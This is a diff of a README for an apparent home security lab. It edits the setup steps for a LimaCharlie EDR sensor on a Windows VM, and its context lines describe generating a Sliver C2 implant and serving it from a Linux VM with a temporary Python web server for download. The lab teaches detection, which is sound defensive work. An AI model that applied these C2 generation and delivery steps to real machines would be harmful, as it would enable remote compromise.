@@ -56,17 +56,7 @@ Install Sysmon and SwiftOnSecurity’s Sysmon config on your Windows VM to gener
 
 
    <p align="center">
-   Now Create an <a href="https://app.limacharlie.io/signup"> LimaCharlie account</a> on your Host machine or another VM.
-  
-   <img src="https://imgur.com/RP9cHJC.png"/>
-  <p align="center">
-  Create an organization using the "Extended Detection & Response Standard" Template.
-    
-   <img src="https://imgur.com/jNfEkET.png"/>
-    <p align="center">
-   Once the organization is created add a sensor to your Windows 11 VM using the "x86-64.exe" architecture.
-
-   <img src="https://imgur.com/VgNqIRe.png"/>
+   Now Create an <a href="https://app.limacharlie.io/signup"> LimaCharlie account</a> on your Host machine or another VM. After that create an organization using the "Extended Detection & Response Standard" Template. Once the organization is created add a sensor to your Windows 11 VM using the "x86-64.exe" architecture.
 
  In your Windows VM, open an Administrative PowerShell prompt and paste the following commands:
   <br />
@@ -129,7 +119,7 @@ generate --http [Your Linux VM IP] --save /opt/sliver</code></li>
   <img src="https://imgur.com/GkvD1OS.png"/>
 
    <p align="center">
-To easily install this newly generated C2 payload from your Linux VM to your Windows VM, start a temporary web server using Python. Exit sliver and run this command:
+To easily install this newly generated C2 payload from your Linux VM to your Windows VM, it's possible to use a temporary web server using Python. Exit sliver and run this command in the terminal:
 <li><code> python3 -m http.server 80 </code></li>
 <p align="center">
 Open up your Windows VM and download your C2 payload from that temporary web server by opening up an Administrative PowerShell console, and using this command:
